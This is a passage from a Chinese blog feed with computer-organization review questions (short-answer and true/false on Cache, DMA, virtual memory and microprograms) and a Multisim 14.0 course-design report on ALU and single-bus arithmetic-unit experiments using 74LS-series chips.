计算机系统中的硬件和软件在逻辑功能等价吗？为什么？</strong><br>答：软件与硬件的逻辑功能是等效的，但性能不相同。<br><strong>33. 微程序控制的基本思想？</strong><br>答：把指令执行所需要的所有控制信号存放在控制存储器中，需要时从这个存储器中读取，即把操作控制信号编成微指令，存放在控制存储器中。一条机器指令的功能通常用许多条微指令组成的序列来实现，这个微指令序列称为微程序。微指令在控制存储器中的存储位置称为微地址。<br><strong>34. 你对Cache存储器的速度不满意，于是申请到一批有限的经费，为能发挥其最大经济效益，有人建议你再买一些同样速度的Cache片子以扩充其容量;而另有人建议你干脆去买更高速的Cache片子将现有的低速Cache片子全部换掉。你认为哪种建议可取？你如何做决定？为什么？</strong><br>答：Cache本身的速度与容量都会影响Cache存储器的等效访问速度。如果对Cache存储器的等效访问速度不满意，需要改进的话，就要作具体分析，看看现在Cache存储器的等效访问速度是否已接近于Cache本身的速度。如果差得较远，说明Cache的命中率低，应从提高Cache命中率着手，包括调整组的大小、块的大小、替换算法以及增大Cache容量等。如果Cache存储器的等效访问速度已经非常接近于Cache本身的速度还不能满足需要，就应该更换更高速的Cache片子。<br><strong>35. 为什么段式虚拟存储系统比页式虚拟存储系统更容易实现信息共享和保护？</strong><br>答：页式虚拟存储系统每个页面是分散存储的，为了实现信息共享和保护，页面之间需要一一对应起来，需要建立大量的页表项。<br>而段式虚拟存储系统中每个段都从0地址开始编址，并采用一段连续的地址空间。在实现信息共享和保护时，只需要为所共享和保护的程序设置一个段表项，将其中的基地址与内存地址一一对应起来即可。<br><strong>36. 以输入为例说明为什么DMA方式比中断方式具有更高的I/O 效率？</strong><br>答：中断方式只是解决了CPU对 I/O设备状态的查询和等待，但数据传送仍然需要CPU参与和中转。输入时，CPU从外设读取数据到寄存器，再将寄存器中的数据存储到内存中；而在DMA方式下，数据传送在DMA控制器的控制下直接在内存和外设间传送，既不需要CPU的参与也没有了中断开销，DMA方式比中断方式具有更高的I/O 效率。</p><h3 id="2021年新增简答题"><a href="#2021年新增简答题" class="headerlink" title="2021年新增简答题"></a>2021年新增简答题</h3><p><strong>35.为什么段式虚拟存储系统比页式虚拟存储系统更容易实现信息共享和保护？</strong><br>答：页式虚拟存储系统每个页面是分散存储的，为了实现信息共享和保护，页面之间需要一一对应起来，需要建立大量的页表项。<br>而段式虚拟存储系统中每个段都从0地址开始编址，并采用一段连续的地址空间。在实现信息共享和保护时，只需要为所共享和保护的程序设置一个段表项，将其中的基地址与内存地址一一对应起来即可。<br><strong>36.以输入为例说明为什么DMA方式比中断方式具有更高的I/O 效率？</strong><br>答：中断方式只是解决了CPU对 I/O设备状态的查询和等待，但数据传送仍然需要CPU参与和中转。输入时，CPU从外设读取数据到寄存器，再将寄存器中的数据存储到内存中；而在DMA方式下，数据传送在DMA控制器的控制下直接在内存和外设间传送，既不需要CPU的参与也没有了中断开销，DMA方式比中断方式具有更高的I/O 效率。</p><h3 id="三．判断题"><a href="#三．判断题" class="headerlink" title="三．判断题"></a>三．判断题</h3><p>1）Cache是内存的一部分，可由指令直接访问。 （错）<br>2）引入虚拟存储器系统的目的是为了加快外存的存取速度。 （错）<br>3）多体交叉存储器主要解决扩充容量问题。 （错）<br>4）计算机中存储器是数据传送中心，但访问存储器的请求是有CPU或I/O所发出的。 （对）<br>5）多体交叉存储器主要解决扩充容量问题。 （错）<br>6）Cache功能全由硬件实现。 （对）<br>7）Cache中的内容应与主存储器的相应单元内容保持一致。 （对）<br>8）兼容机之间的指令系统是相同的，但硬件实现方法可以不同。（对）<br>9）系列机中不同型号计算机，保持软件向上兼容特点。（对）<br>10）RISC的主要目标是减少指令数，降低软硬件开销。（对）<br>11）DMA控制器和CPU可以同时使用总线。（错）<br>12）所有数据传送方式都必须由CPU控制。（错）<br>13）外部设备一旦申请中断，便能立即得到CPU响应。（错）<br>14）I/O设备编址方式分为单独编址和存储器映射两种。（对）<br>15）DMA设备的中断级别比其他外设高，否则可能引起数据丢失。（对）<br>14）中断方式一般适用于随机出现的服务。（对）<br>15）中断屏蔽技术是用中断屏蔽寄存器对中断请求线进行屏控制，只有多级中断系统才能采用中断屏蔽技术。（错）<br>16）动态RAM和静态RAM都是易失性半导体存储器。（对）<br>17）因为动态存储器是破坏性读出，所以必须不断刷新。（错）<br>18）一般情况下，ROM和RAM在存储体中是统一编址的。（对）<br>19）内存和外存都能直接向CPU提供数据。（错）<br>20）一个指令周期由若干个机器周期组成。（对）<br>21）与微程序控制器相比，组合逻辑控制器的速度较快。（对）<br>22）引入虚拟存储系统的目的是提高存储速度。（错）<br>23）ＤＭＡ方式进行外设与主机交换信息时，不需要向主机发出中断请求。（错）<br>24）CPU以外的设备都称外部设备。（错）<br>25）奇偶校验可以纠正代码中出现的错误。（错）<br>26）用微指令的分段译码法设计微指令时，需将具有相斥性的微命令组合在同一字段内。（对）<br>27）CPU访问存储器的时间是由存储器的容量决定的，存储容量越大，访问存储器所需的时间越长。（错）<br>28）主程序运行时何时转向为外设服务的中断服务程序是预先安排好的。（错）<br>29）时序电路用来产生各种时序信号，以保证整个计算机协调地工作。（对）<br>30）在CPU运行主程序时，接受到非预期的中断请求，CPU暂停现行工作转向为中断请求服务，待服务完毕后回到住程序继续执行。（对）<br>31）冯•诺伊曼机工作方式的基本特点是按地址访问并顺序执行指令。（对）<br>32）总线中地址线的作用是用于选择指定存储器单元和I/O设备接口电路的地址。（对）<br>33）总线的异步通信方式是不采用时钟信号，只采用握手信号。（对）<br>34）变址寻址方式中，操作数的有效地址是变址寄存器内容加上形式地址。（对）<br>35）在控制器的控制方式中，机器周期内的时钟周期个数可以不相同，这属于同步控制。（对）<br>36）微程序控制器比硬连线控制器更加灵活。（对）<br>37）一个更高级的中断请求一定可以中断另一个中断处理程序的执行。（错）<br>38）DMA的数据传送不需CPU控制。（对）<br>39）DMA和CPU必须分时使用总线。（对）<br>40）垂直型微指令的特点是采用微操作码。（对）<br>41） 在指令长度相同的情况下，所有指令的取指操作都是相同的。（对）<br>42）指令周期的第一个操作是取指令。（对）<br>43）为了进行取指令操作，控制器需要得到相应的指令。（对）<br>44）取指令操作是控制器自动进行的。（对）<br>45）微程序控制器比硬连线控制器更加灵活。（对）<br>46）指令周期的第一个操作是取数据。（错）<br>47）控制器产生的所有控制信号称为微指令。（错）<br>48）微处理器的程序称为微程序。（错）<br>49）采用微程序控制器的处理器称为微处理器。（错）<br>50）决定计算机运算精度的主要技术指标是计算机的字长。（对）<br>51）取指令操作是控制器固有的功能，不需要在操作码控制下完成。（对）<br>52）一个指令周期由若干个机器周期组成。（对）<br>53）在各种微地址形成方式中，增量计数器法需要的顺序控制字段较短。（对）<br>54）半导体RAM是易失性RAM， 而静态RAM只有在电源不掉电时，所存信息是不易失的。    （对）<br>55）虚存中每次访问一个虚拟地址，至少要访问两次主存。（错）</p><p><strong>下面是最难顶的大题，不过同学，请相信你身为弗兰阔技人的能力！！！</strong></p><h3 id="四-大题"><a href="#四-大题" class="headerlink" title="四. 大题"></a>四. 大题</h3>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 习题 </tag>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理课程设计</title>
      <link href="/2021/01/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"/>
      <url>/2021/01/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="我用的是什么软件？"><a href="#我用的是什么软件？" class="headerlink" title="我用的是什么软件？"></a>我用的是什么软件？</h2><p><strong>multisim14.0</strong></p><h2 id="我为什么要写这个东西？"><a href="#我为什么要写这个东西？" class="headerlink" title="我为什么要写这个东西？"></a>我为什么要写这个东西？</h2><p>当然是为了学分呀！</p><h3 id="第一部分-Multisim-使用指南"><a href="#第一部分-Multisim-使用指南" class="headerlink" title="第一部分  Multisim 使用指南"></a>第一部分  Multisim 使用指南</h3><p>随着电子技术和计算机技术的发展，电子产品已与计算机紧密相连，电子产品的智能化日益完善，电路的集成度越来越高，而产品的更新周期却越来越短。电子设计自动化（EDA）技术，使得电子线路的设计人员能在计算机上完成电路的功能设计、逻辑设计、性能分析、时序测试直至印刷电路板的自动设计。EDA是在计算机辅助设计（CAD）技术的基础上发展起来的计算机设计软件系统。与早期的CAD软件相比，EDA软件的自动化程度更高、功能更完善、运行速度更快，而且操作界面友善，有良好的数据开放性和互换性。<br>　　MultiSim是由Electronics Workbench (EWB)发展而来，该软件是加拿大Interactive Image Technologies公司于八十年代末、九十年代初推出的电子电路仿真的虚拟电子工作台软件，现已并入National Instruments（NI，国家仪器有限公司）并改名Multisim，是一个完整的设计工具系统，提供了一个非常大的元件数据库，并提供原理图输入接口、全部的数模Spice仿真功能、VHDL|Verilog设计接口与仿真功能、FPGA|CPLD综合、RF设计能力和后处理功能，还可以进行从原理图到PCB布线工具包（如：Electronics Workbench的Ultiboard2001）的无缝隙数据传输。它具有这样一些特点：<br>（1）采用直观的图形界面创建电路：在计算机屏幕上模仿真实实验室的工作台，绘制电路图需要的元器件、电路仿真需要的测试仪器均可直接从屏幕上选取；<br>（2）软件仪器的控制面板外形和操作方式都与实物相似，可以实时显示测量结果。<br>（3）软件带有丰富的电路元件库，提供多种电路分析方法。<br>（4）作为设计工具，它可以同其它流行的电路分析、设计和制板软件交换数据。<br>（5）还是一个优秀的电子技术训练工具，利用它提供的虚拟仪器可以用比实验室中更灵活的方式进行电路实验，仿真电路的实际运行情况，熟悉常用电子仪器测量方法。<br>　　因此非常适合电子类课程的教学和实验，由于其功能非常强大，所以在这里只对课程设计有关的初步知识，基本操作方法进行介绍，有兴趣深入了解的同学可自行访问<a href="http://www.ni.com/multisim/zhs/">click me</a>。　  </p><h4 id="软件基本操作方法介绍"><a href="#软件基本操作方法介绍" class="headerlink" title="软件基本操作方法介绍"></a>软件基本操作方法介绍</h4><h4 id="电路创建"><a href="#电路创建" class="headerlink" title="电路创建"></a>电路创建</h4><p>由于版本不同，元件工具栏、仪表栏、仿真开关等初始位置会不同。所以在我自己进行课程设计的时候，按10版本的指导书做实验相当痛苦，因为它给的工具栏的位置根本对不上我14.0的版本。<br><strong>这里强调，下面的基本视窗和元件工具栏是按multisim14.0版写的。</strong><br>下面是multisim14.0的基本视窗：<br><img src="/images/window.png"><br>下面是14.0版本的元件工具栏<br><img src="/images/windowtool.png"></p><h5 id="连线"><a href="#连线" class="headerlink" title="连线"></a>连线</h5><p>Multisim有自动与手工两种连线方法。自动连线选择管脚间最好的路径自动为您完成连线，它可以避免连线通过元件和连线重叠；<br>手工连线要求用户控制连线路径。可以将自动连线与手工连线结合使用，比如，开始用手工连线，然后让Multisim自动地完成连线。<br><strong>自动连线：单击甲部件管脚，再单击乙部件欲连线管脚，实现自动连线。</strong><br><strong>手工连线：在甲乙两部件之间增加若干“节点”，然后进行连线。</strong><br><strong><em>另外：已经画好的连线可选择其线段用鼠标进行拖动改变位置，使线路更清晰。还可以在图中增加文本进行注释。具体操作可自行详细体会。</em></strong><br>所有元件都放置好并连线，就可以进行仿真。</p><h5 id="用户自定义元件的创建"><a href="#用户自定义元件的创建" class="headerlink" title="用户自定义元件的创建"></a>用户自定义元件的创建</h5><p>在实验过程中有时也需要一些标准库中没有的元件，此时只有自行定义了。<br>（1）    创建<br>菜单命令“Place” 、“New Hierarchical Block”出现如下对话框：<br><img src="/images/HBP.png"><br>     <strong>图1-2 新建层次块示意图</strong><br>在指定文件夹中创建指定的层次块，当然要指定输入引脚和输出引脚的数量。对于8位ALU层次块来说，有22输入，9个输出引脚。如图1-3所示。<br> <img src="/images/ALU.jpg"><br>     <strong>图1-3 8位ALU层次块示意图</strong><br>在图1-2中“确定”后进入图1-3，当然中间的两个74ls181n是后来加进来的，并且图右下侧的“电源”和“接地”的元件如果没有的话，在Multisim版本中层次块无法正常使用。<br>进入图1-3后，左边一列为输入引脚，双击引脚名可改为更直观的A1-A8,B1-B8,S0-S4,以及输入进位Cin和算逻运算控制端M。右边一列为输入出引脚，同理，进行修改。<br>当元件放置后并正确连线，存盘。<br>（2）    引用<br>如果在某电路文件中要使用该层次块，可“Place” 、“Hierarchical Block from File”在对话框中选择该层次块文件，则将该自定义元件放置到电路中，如图1-4所示。<br> <img src="/images/8_ALU.jpg"><br>     <strong>图1-4 8位ALU层次块引用示意图</strong><br>层次块加入电路后，连线组成具体电路。在后面实验中还要使用一些层次块电路，下面一一列出。<br> <img src="/images/7LS244N.png"><br>     <strong>图1-5 74LS244N层次块示意图</strong><br> <img src="/images/4LS273N.png"><br>     <strong>图1-6 74LS273N层次块示意图</strong><br> <img src="/images/74LS374N.png"><br>     <strong>图1-7 74LS374N层次块示意图</strong><br> <img src="/images/K8.png"><br>     <strong>图1-8 K8层次块示意图</strong><br>在高版本Multisim中有“DSWPK_8”可代替K8层次块。<br>在制作层次块时对相关元件的功能请自行参详。<br>另外更高版本中已经可以采用“子电路”形式创建用户自定义元件.</p><blockquote><p>参考文献：主要参考NI网络文件《Multisim10 电路设计实训教程》</p></blockquote><h3 id="第二部分-课程设计"><a href="#第二部分-课程设计" class="headerlink" title="第二部分 课程设计"></a>第二部分 课程设计</h3><h4 id="一、课程设计的主要任务和目的"><a href="#一、课程设计的主要任务和目的" class="headerlink" title="一、课程设计的主要任务和目的"></a>一、课程设计的主要任务和目的</h4><p>课程设计的主要任务是运用有关的知识技术，正确处理各种因素间的相互关系，创造性地完成符合实际要求的设计任务。在独立思考，独立工作和联系实际方面，它对实验者的要求高于平时作业。具体要求如下：<br>1)、能独立运用理论知识和实际材料来解决问题。<br>2)、对所搜集的材料、参考书、文献所提供的论点有周密的组织能力。<br>3)、能用通顺的文字和准确的图表，系统地、完整地表达设计的成果。<br>4)、课程设计辅导老师检查完成情况后，应及时提交实验报告，实验报告主要内容：实验名称及实验完成者、实验目的和任务、实验结果及分析。<br>课程设计的目的是：激发实验者的学习热情，培养其独立工作的能力，让他们在实践活动中将所学知识综合运用，增长才干，积累经验。</p><h4 id="二、具体实验"><a href="#二、具体实验" class="headerlink" title="二、具体实验"></a>二、具体实验</h4><h5 id="实验一-验证74LS181运算和逻辑功能"><a href="#实验一-验证74LS181运算和逻辑功能" class="headerlink" title="实验一   验证74LS181运算和逻辑功能"></a>实验一   验证74LS181运算和逻辑功能</h5><p><strong>1、实验目的</strong><br>（1）    掌握算术逻辑单元（ALU）的工作原理；<br>（2）    熟悉简单运算器的数据传送通路；<br>（3）    画出逻辑电路图及布出美观整齐的接线图；<br>（4）    验证4位运算功能发生器(74LS181)组合功能。<br><strong>2、实验原理</strong><br>ALU能进行多种算术运算和逻辑运算。4位ALU-74LS181能进行16种算术运算和逻辑运算。功能表如下：<br><img src="/images/%E8%A1%A81.png"><br><strong>(上表中的“/”表示求反)</strong></p><p><strong>ALU-74LS181引脚说明：M=1 逻辑运算，M=0算术运算。</strong><br><img src="/images/%E8%A1%A82.png"></p><p><strong>3、实验内容</strong><br>电路如图2-1所示。<br><img src="/images/%E4%BB%A4%E4%BA%BA%E7%AA%92%E6%81%AF.png"><br><strong>图2-1 4位ALU验证电路示意图</strong></p><p><strong>验证74LS181型4位ALU的逻辑算术功能，填写下表：</strong><br><img src="/images/%E8%A1%A83.png"></p><h6 id="实验报告"><a href="#实验报告" class="headerlink" title="实验报告"></a>实验报告</h6><p><strong>实验原理：ALU能够进行多种算术运算和逻辑运算。4位ALU—74LS181能够进行16算术运算和逻辑运算。</strong><br><img src="/images/74LS181.png"><br>74LS181芯片介绍：该芯片总共有22个引脚，其中包括8个数据输入端：A0、A1、A2、A3，B0、B1、B2、B3。（在八个输入端中，A3和B3为高位）。这八个输入端都是低电平时有效。同时，该芯片还包括S0、S1、S2、S3这四个控制端，这四个控制端主要控制两个四位输入数据的运算，例如加、减、与、或。CN端处理进入芯片的前进位值，M端控制芯片的运算方式，包括算术运算和逻辑运算。F0、F1、F2、F3是四个二进制输出端，以一个四位二进制形式输出运算的结果。CN4负责记录运算后的进位。下面的AEQB、P和G没有用到。<br><strong>实验内容：</strong><br>实验电路图如下：<br><img src="/images/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%94%B5%E8%B7%AF%E5%9B%BE.png"></p><p>验证后的实验表格填写如下：<br><img src="/images/%E9%AA%8C%E8%AF%811.png"></p><h5 id="实验二-运算器"><a href="#实验二-运算器" class="headerlink" title="实验二 运算器"></a>实验二 运算器</h5><p><strong>1、实验目的</strong><br>（1）    熟练掌握算术逻辑单元（ALU）的应用方法；<br>（2）    进一步熟悉简单运算器的数据传送原理；<br>（3）    画出逻辑电路图及布出美观整齐的接线图；<br>（4）    熟练掌握有关数字元件的功能和使用方法。<br>（5）    熟练掌握子电路的创建及使用。<br><strong>2、实验原理</strong><br>本实验仿真单总线结构的运算器，原理如图2-2所示。相应的电路如图2-3所示。<br>电路图中，上右下三方的8条线模拟8位数据总线；K8产生所需数据；74244层次块为三态门电路，将部件与总线连接或断开，<strong>切记总线上只能有一个输入；</strong><br>两个74273层次块作为暂存工作寄存器DR1和DR2；两个74374层次块作为通用寄存器组（鉴于电路排列情况，只画出两个通用寄存器GR1和GR2，如果可能的话可设计4个或8个通用寄存器）；众多的开关作为控制电平或打入脉冲；众多的8段代码管显示相应位置的数据信息；核心为8位ALU层次块。<br><img src="/images/%E8%BF%90%E7%AE%97%E5%99%A8%E7%A4%BA%E6%84%8F%E5%9B%BE.png"><br><strong>图2-2 单总线结构的运算器示意图</strong></p><p><strong>3、实验内容</strong><br>在Multisim画出电路图并仿真，完成如下操作。<br>（1）    说明整个电路工作原理。<br>（2）    说明74LS244N的功能及其在电路中作用，及输入信号G有何作用；<br>（3）    说明74LS273N的功能及其在电路中作用，及输入信号CLK有何作用；<br>（4）    说明74LS374N的功能及其在电路中作用，及CLK和OC有何作用；<br>（5）    K8产生任意数据存入通用寄存器GR1。<br>（6）    K8产生任意数据存入通用寄存器GR2。<br>（7）    完成GR1+GR2→GR1。<br>（8）    完成GR1-GR2→GR2。<br>（9）    完成GR1∧GR2→GR1。<br>（10）    完成GR1∨GR2→GR2。<br>（11）    完成GR1⊕GR2→GR1。<br>（12）    -GR1→GR2。（“-”表示逻辑非运算）<br>（13）    -GR2→GR1。</p><h6 id="实验报告-1"><a href="#实验报告-1" class="headerlink" title="实验报告"></a>实验报告</h6><p><strong>实验原理：</strong><br>本实验仿真单总线结构的运算器，原理如图2-2所示。<br>相应的电路如图2-3所示。<br>（1）    电路图中，上右下三方的8条线模拟8位数据总线；<br>（2）    K8产生所需数据；<br>（3）    74244层次块为三态门电路，将部件与总线连接或断开，切记总线上只能有一个输入；<br>（4）    两个74273层次块作为暂存工作寄存器DR1和DR2；<br>（5）    两个74374层次块作为通用寄存器组（鉴于电路排列情况，只画出两个通用寄存器GR1和GR2，如果可能的话可设计4个或8个通用寄存器）；<br>（6）    众多的开关作为控制电平或打入脉冲；众多的8段代码管显示相应位置的数据信息；核心为8位ALU层次块。<br><img src="/images/%E8%BF%90%E7%AE%97%E5%99%A8%E7%A4%BA%E6%84%8F%E5%9B%BE.png"><br><strong>图2-2 单总线结构的运算器示意图</strong></p><p><strong>实验内容：</strong><br><img src="/images/%E5%A5%BD%E5%A4%8D%E6%9D%82%E7%9A%84%E7%94%B5%E8%B7%AF%E5%9B%BE.png"><br><strong>图2-3 运算器示意图</strong><br>在Multisim画出电路图并仿真<br><img src="/images/7LS244N.png"><br><strong>74LS244N层次块电路图</strong><br><img src="/images/4LS273N.png"><br><strong>74LS273N层次块电路图</strong><br><img src="/images/74LS374N.png"><br><strong>74LS374N层次块电路图</strong><br><img src="/images/K8new.png"><br><strong>K8层次块示意图</strong><br><img src="/images/%E8%BF%90%E7%AE%97%E5%99%A8%E7%94%B5%E8%B7%AF%E5%9B%BE.png"><br><strong>实验二：运算器电路图</strong><br>完成下列操作：<br>（1）说明整个电路工作原理。<br>    1.电路图中，上右下三方的8条线模拟8位数据总线；<br>    2.K8产生所需数据；<br>    3.74244层次块为三态门电路，将部件与总线连接或断开，切记总线上只能有一个输入；<br>    4.两个74273层次块作为暂存工作寄存器DR1和DR2；两个74374层次块作为通用寄存器组（鉴于电路排列情况，只画出两个通用寄存器GR1和GR2，如果可能的话可设计4个或8个通用寄存器）；<br>    5.众多的开关作为控制电平或打入脉冲；众多的8段代码管显示相应位置的数据信息；<br>    6.核心为8位ALU层次块。<br>实验电路共分为五个部分：输入数据、显示数据、运算处理数据、存储数据以及控制数据流向。<br>    1.输入数据部分由自定义层次块K8负责，通过控制内部的八个开关，来向总线中输入两个不同的二进制数。<br>    2.数据流入的地方，对应的DCD_HEX_DIG_RED元器件屏幕将会显示出对应的数，主要有从暂存器中传出的数据、从寄存器中传出的数据以及传入总线上的数据。<br>    3.运算处理数据部分主要由一块74LS181N芯片组成，实现了两个二进制数的逻辑运算和算术运算，并能够将结果通过总线输出并显示。<br>    4.存储模块主要由两个自定义结构块74LS374构成，用来存放操作数和运算结果。<br>    5.控制数据流向主要有左右两侧的开关进行操作，通过控制开关来实现数据在各部件之间的流转和操作执行，从而实现一条完整的操作链。<br>（2）说明74LS244N的功能及其在电路中作用，及输入信号G有何作用。<br>答: 74LS244 为3态8位缓冲器，一般用作总线驱动器，没有锁存的功能，是一个暂存器，它根据控制信号的状态，将总线上地址代码暂存起来。在电路中在部件与总线之间起开关作用，信号G为低电平有效。<br>（3）说明74LS273N的功能及其在电路中作用，及输入信号CLK有何作用。<br>答：74LS273是一种带清除功能的8D触发器，1D - 8D为数据输入端，1Q -8Q为数据输出端，正脉冲触发，低电平清除，常用作数据锁存器，地址锁存器。在电路中作为数据锁存器，输入信号CLK在时钟信号上升沿有效，当接收到正脉冲时，将“D”端的数据传送到“Q”端。<br>（4）说明74LS374N的功能及其在电路中作用，及CLK和OC有何作用。<br>答：74LS374为具有三态输出的8D边缘触发器。在电路中寄存数据，OC为低电平时有效，可以寄存输入进来的数据；OC为高电平时断开。CLK在时钟信号上升沿工作，当接收到正脉冲时将积存的数据输出。<br>（5）K8产生任意数据存入通用寄存器GR1。<br>答：通过K8设定数据，将电路图左侧开关全部调整为高电平，X2的G信号端输入低电平，将数据输入到总线中，然后，将GR1的OC端和CLK端输入低电平，给GR1的CLK端一个正脉冲（0→1）完成数据存入，随即OC端接入高电平，关闭GR1。<br>（6）K8产生任意数据存入通用寄存器GR2。<br>答：通过K8设定数据，将电路图左侧开关全部调整为高电平，X2的G信号端输入低电平，将数据输入到总线中，然后，将GR2的OC端和CLK端输入低电平，给GR2的CLK端一个正脉冲（0→1）完成数据存入，随即OC端接入高电平，关闭GR2。<br>（7）完成GR1+GR2→GR1。<br>    1.根据（6）、（7）中的操作将任意数存入GR1和GR2当中，将所有开关调为1， X6中G信号调为0，X10中的OC端口调为0，X12中的G信号调为0，X6中的G信号调为0，X8中的CLK端口从0→1（正脉冲），将GR1中的数据传入DR1中。<br>    2.然后，再次将所有的开关调为1，将X9的OC端口调为0，X11的G信号调为0，X3的G信号调为0，X4的CLK端口从0→1（正脉冲），将GR2中的数据传入DR2中。<br>    3.调节X5中的S0、S1、S2、S3依次为1、0、0、1，将X5中的M调为0，CN调为1，令X7的G信号为0，结果送入总线，将X10的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR1中。<br>（8）完成GR1-GR2→GR2。<br>    1.根据（6）、（7）中的操作将任意数存入GR1和GR2当中，将所有开关调为1， X6中G信号调为0，X10中的OC端口调为0，X12中的G信号调为0，X6中的G信号调为0，X8中的CLK端口从0→1（正脉冲），将GR1中的数据传入DR1中。<br>    2.然后，再次将所有的开关调为1，将X9的OC端口调为0，X11的G信号调为0，X3的G信号调为0，X4的CLK端口从0→1（正脉冲），将GR2中的数据传入DR2中。<br>    3.调节X5中的S0、S1、S2、S3依次为0、1、1、0，将X5中的M调为0，CN调为0，令X7的G信号为0，结果送入总线，将X10的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR1中。<br>（9）完成GR1∧GR2→GR1。<br>    1.根据（6）、（7）中的操作将任意数存入GR1和GR2当中，将所有开关调为1， X6中G信号调为0，X10中的OC端口调为0，X12中的G信号调为0，X6中的G信号调为0，X8中的CLK端口从0→1（正脉冲），将GR1中的数据传入DR1中。<br>    2.然后，再次将所有的开关调为1，将X9的OC端口调为0，X11的G信号调为0，X3的G信号调为0，X4的CLK端口从0→1（正脉冲），将GR2中的数据传入DR2中。<br>    3.调节X5中的S0、S1、S2、S3依次为1、0、1、1，将X5中的M调为1，令X7的G信号为0，结果送入总线，将X10的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR1中。<br>（10）完成GR1∨GR2→GR2。<br>    1.根据（6）、（7）中的操作将任意数存入GR1和GR2当中，将所有开关调为1， X6中G信号调为0，X10中的OC端口调为0，X12中的G信号调为0，X6中的G信号调为0，X8中的CLK端口从0→1（正脉冲），将GR1中的数据传入DR1中。<br>    2.然后，再次将所有的开关调为1，将X9的OC端口调为0，X11的G信号调为0，X3的G信号调为0，X4的CLK端口从0→1（正脉冲），将GR2中的数据传入DR2中。<br>    3.调节X5中的S0、S1、S2、S3依次为1、1、1、0，将X5中的M调为1，令X7的G信号为0，结果送入总线，将X9的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR2中。<br>（11）完成GR1⊕GR2→GR1。<br>    1.根据（6）、（7）中的操作将任意数存入GR1和GR2当中，将所有开关调为1， X6中G信号调为0，X10中的OC端口调为0，X12中的G信号调为0，X6中的G信号调为0，X8中的CLK端口从0→1（正脉冲），将GR1中的数据传入DR1中。<br>    2.然后，再次将所有的开关调为1，将X9的OC端口调为0，X11的G信号调为0，X3的G信号调为0，X4的CLK端口从0→1（正脉冲），将GR2中的数据传入DR2中。<br>    3.调节X5中的S0、S1、S2、S3依次为0、1、1、0，将X5中的M调为1，令X7的G信号为0，结果送入总线，将X10的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR1中。<br>（12）-GR1→GR2。（“-”表示逻辑非运算）<br>    1.根据（6）中的操作将任意数存入GR1当中，将所有开关调为1， X6中G信号调为0，X10中的OC端口调为0，X12中的G信号调为0，X6中的G信号调为0，X8中的CLK端口从0→1（正脉冲），将GR1中的数据传入DR1中。<br>    2.调节X5中的S0、S1、S2、S3依次为0、0、0、0，将X5中的M调为1，令X7的G信号为0，结果送入总线，将X9的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR2中。<br>（13）GR2→GR1。<br>    1.根据（7）中的操作将任意数存入GR2当中，将所有开关调为1，将X9的OC端口调为0，X11的G信号调为0，X3的G信号调为0，X4的CLK端口从0→1（正脉冲），将GR2中的数据传入DR2中。<br>    2.调节X5中的S0、S1、S2、S3依次为0、1、0、1、，将X5中的M调为1，令X7的G信号为0，结果送入总线，将X10的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR1中。</p><h5 id="实验三-字发生器及跑马灯"><a href="#实验三-字发生器及跑马灯" class="headerlink" title="实验三 字发生器及跑马灯"></a>实验三 字发生器及跑马灯</h5><p><strong>1、实验目的</strong><br>了解字发生器使用方法</p><p><strong>前提知识</strong></p><p><font color=red> 字发生器 </font></p><table><tr><td bgcolor=green>字信号发生器（Word Generator）可以采用多种方式产生32位同步逻辑信号，用于对数字电路进行测试，是一个通用的数字输入编辑器。单击Simulate/Instruments/Word Generator,得到如图2-4（a）所示的字信号发生器的图标。在字信号发生器的左右两侧各有16个端口，分别为0～15和16～31的数字信号输出端，下面的R表示输出端，用以输出与字信号同步的时钟脉冲；T表示输入端，用来接外部触发信号。双击图2-4（a）中的字信号发生器图标，便可以得到图2-4（b）所示的字信号发生器内部参数设置控制面板。该控制面板大致分为5个部分。</td></tr></table><p><img src="/images/%E5%AD%97%E5%8F%91%E7%94%9F%E5%99%A8.png"></p><p><strong>图2-4字信号发生器内部参数设置控制面板</strong><br>(1)Control区：输出字符控制，用来设置字信号发生器的最右侧的字符编辑显示区字符信号的输出方式，有下列3种模式。<br>    Cycle 区：在已经设置好的初始值和终止值之间循环输出字符。<br>    Burst:每单击一次，字信号发生器将从初始值开始到终止值之间的逻辑字符输出一次，即单页模式。<br>    Step：每单击一次，输出一条字信号。即单步模式。<br>    单击Set按钮，弹出如图2-5所示的对话框。该对话框主要用来设置字符信号的变化规律。其中各参数含义如下所述。<br>        No Change：保持原有的设置。</p><p><img src="/images/%E5%AD%97%E7%AC%A6%E4%BF%A1%E5%8F%B7%E5%8F%98%E5%8C%96%E8%A7%84%E5%BE%8B.png">    </p><p><strong>图2-5 字符信号的变化规律</strong><br>    Load：装载以前的字符信号的变化规律的文件。<br>     Save：保存当前的字符信号的变化规律的文件。<br>     Clear buffer:将字信号发生器的最右侧的字符编辑显示区的字信号清零。<br>     Up Count：字符编辑显示区的字信号以加1的形式计数。<br>     Down Count：字符编辑显示区的字信号以减1的形式计数。<br>     Shift Right：字符编辑显示区的字信号右移。<br>     Shift Left：字符编辑显示区的字信号左移。<br>     Display Type选项区：用来设置字符编辑显示区的字信号的显示格式：Hex（十六进制），Dec（十进制）。<br>     Buffer Size：字符编辑显示区的缓冲区的长度。<br>     Initial Patterns：采用某种编码的初始值。<br>(2)Display区：用于设置字信号发生器的最右侧的字符编辑显示区的字符显示格式，有Hex、Dec、Binary、ASCII等几种计数格式。<br>(3)Trigger区：用于设置触发方式。<br>    Internal：内部触发方式，字符信号的输出由Control区的3种输出方式中的某一种来控制。<br>    